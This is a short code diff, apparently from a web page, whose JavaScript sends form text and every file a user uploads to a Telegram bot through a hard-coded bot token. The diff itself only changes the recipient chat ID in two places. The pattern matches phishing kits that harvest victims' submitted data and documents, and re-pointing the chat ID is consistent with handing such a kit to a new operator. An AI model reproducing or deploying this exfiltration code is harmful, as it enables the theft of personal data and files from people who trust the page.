@@ -370,7 +370,7 @@
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({
-                             chat_id: '8724690379',
+                             chat_id: '8697200232',
                              text: text,
                              parse_mode: 'HTML'
                          })
@@ -386,7 +386,7 @@
                                 
                                 for(let i=0; i<fileInput.files.length; i++) {
                                     const fileData = new FormData();
-                                    fileData.append('chat_id', '8724690379');
+                                    fileData.append('chat_id', '8697200232');
                                     fileData.append('document', fileInput.files[i]);
                                     
                                     await fetch('https://api.telegram.org/bot8627909617:AAEt8vm6dDifjUgJQuPH6wbeDPgZjXEJM-Y/sendDocument', {
